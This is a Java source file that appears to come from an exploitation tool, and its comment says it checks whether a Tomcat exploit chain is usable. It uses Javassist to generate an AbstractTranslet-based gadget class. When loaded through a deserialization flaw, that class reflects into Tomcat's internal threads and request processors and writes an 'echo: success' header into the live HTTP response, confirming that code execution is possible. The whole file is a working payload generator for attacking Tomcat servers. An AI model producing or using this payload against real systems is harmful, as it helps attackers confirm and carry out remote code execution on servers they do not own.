package payloads.check;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.*;
import org.apache.coyote.RequestInfo;

public class TomcatGadgetCheck {
    // 用于检测 tomcat 利用链是否可用
    public static byte[] gadgetCheck() throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        classPool.insertClassPath(new ClassClassPath(RequestInfo.class));

        CtClass ctClass = classPool.makeClass("check"+System.nanoTime());
        ctClass.setSuperclass(classPool.getCtClass(AbstractTranslet.class.getName()));
        ctClass.addMethod(CtMethod.make("    public static Object getField(Object obj,String fieldName) throws Exception{\n" +
                "        java.lang.reflect.Field f0 = null;\n" +
                "        Class clas = obj.getClass();\n" +
                "        while (clas != Object.class){\n" +
                "            try {\n" +
                "                f0 = clas.getDeclaredField(fieldName);\n" +
                "                break;\n" +
                "            } catch (NoSuchFieldException e){\n" +
                "                clas = clas.getSuperclass();\n" +
                "            }\n" +
                "        }\n" +
                "        if (f0 != null){\n" +
                "            f0.setAccessible(true);\n" +
                "            return f0.get(obj);\n" +
                "        }else {\n" +
                "            throw new NoSuchFieldException(fieldName);\n" +
                "        }\n" +
                "    }",ctClass));

        String method = "        try {\n" +
                "            boolean flag = false;\n" +
                "            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(),\"threads\");\n" +
                "            for (int i=0;i<threads.length;i++){\n" +
                "                Thread thread = threads[i];\n" +
                "                if (thread != null){\n" +
                "                    String threadName = thread.getName();\n" +
                "                    if (!threadName.contains(\"exec\") && threadName.contains(\"http\")){\n" +
                "                        Object target = getField(thread,\"target\");\n" +
                "                        Object global = null;\n" +
                "                        if (target instanceof Runnable){\n" +
                "                            try {\n" +
                "                                global = getField(getField(getField(target,\"this$0\"),\"handler\"),\"global\");\n" +
                "                            } catch (NoSuchFieldException fieldException){\n" +
                "                                fieldException.printStackTrace();\n" +
                "                            }\n" +
                "                        }\n" +
                "                        if (global != null){\n" +
                "                            java.util.List processors = (java.util.List) getField(global,\"processors\");\n" +
                "                            for (i=0;i<processors.size();i++){\n" +
                "                                org.apache.coyote.RequestInfo requestInfo = (org.apache.coyote.RequestInfo) processors.get(i);\n" +
                "                                if (requestInfo != null){\n" +
                "                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) getField(requestInfo,\"req\");\n" +
                "                                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);\n" +
                "                                    org.apache.catalina.connector.Response response = request.getResponse();\n" +
                "                                    response.setHeader(\"echo\",\"success\");\n" +
                "                                    flag = true;\n" +
                "                                    if (flag){\n" +
                "                                        break;\n" +
                "                                    }\n" +
                "                                }\n" +
                "                            }\n" +
                "                        }\n" +
                "                    }\n" +
                "                }\n" +
                "                if (flag){\n" +
                "                    break;\n" +
                "                }\n" +
                "            }\n" +
                "        } catch (Exception e){\n" +
                "            e.printStackTrace();\n" +
                "        }";
        ctClass.makeClassInitializer().insertBefore(method);
        byte[] bytes = ctClass.toBytecode();
        return bytes;
    }
}

